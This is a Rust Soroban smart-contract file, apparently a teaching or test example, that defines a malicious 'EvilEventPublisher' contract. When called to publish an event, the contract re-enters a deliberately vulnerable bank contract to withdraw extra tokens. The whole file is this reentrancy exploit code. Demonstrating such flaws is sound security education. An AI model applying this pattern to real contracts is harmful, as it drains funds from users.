#![no_std]
use soroban_sdk::{contractimpl, contracttype, Env, Symbol, Address};

mod vulnerable_bank {
    soroban_sdk::contractimport!(
        file = "../vulnerable_bank/target/wasm32-unknown-unknown/release/vulnerable_bank.wasm"
    );
}

mod event_publisher {
    soroban_sdk::contractimport!(
        file = "../event_publisher/target/wasm32-unknown-unknown/release/event_publisher.wasm"
    );
}




#[derive(Clone)]
#[contracttype]
pub enum DataKey {  
    Bank,
    EventPublisher
}

pub struct EvilEventPublisher;
#[contractimpl]
impl EvilEventPublisher {

    pub fn initialize(env: Env, bank: Address, event_publisher: Address) {
        env.storage().set(&DataKey::Bank, &bank);
        env.storage().set(&DataKey::EventPublisher, &event_publisher);
    }

    // This evil contract, instead of "just" publishing an event, it will call again to the
    // vulnerable bank contract in order to withdraw more tokens
    pub fn publish_withdraw(env: Env, user: Address, amount: i128) {

        let bank_address = env.storage().get(&DataKey::Bank).unwrap().unwrap();
        let bank_client = vulnerable_bank::Client::new(&env, &bank_address);

        let event_publisher_address = env.storage().get(&DataKey::EventPublisher).unwrap().unwrap();

        bank_client.withdraw(&user.clone(), &amount.clone(), &event_publisher_address);

        let topics = (Symbol::short("withdraw"), user);
        env.events().publish(topics, amount);
    }
}

mod test;
